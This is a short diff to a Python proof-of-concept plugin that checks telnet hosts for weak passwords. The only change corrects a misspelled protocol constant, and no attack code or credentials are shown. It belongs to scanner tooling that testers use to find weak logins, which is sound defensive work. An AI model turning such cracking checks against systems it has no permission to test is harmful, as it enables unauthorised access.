@@ -29,7 +29,7 @@ class DemoPOC(POCBase):
     desc = '''telnet 存在弱密码，导致攻击者可登录主机进行恶意操作'''
     samples = ['']
     category = POC_CATEGORY.TOOLS.CRACK
-    protocol = POC_CATEGORY.PROTOCOL.TELENT
+    protocol = POC_CATEGORY.PROTOCOL.TELNET
 
     def _verify(self):
         result = {}
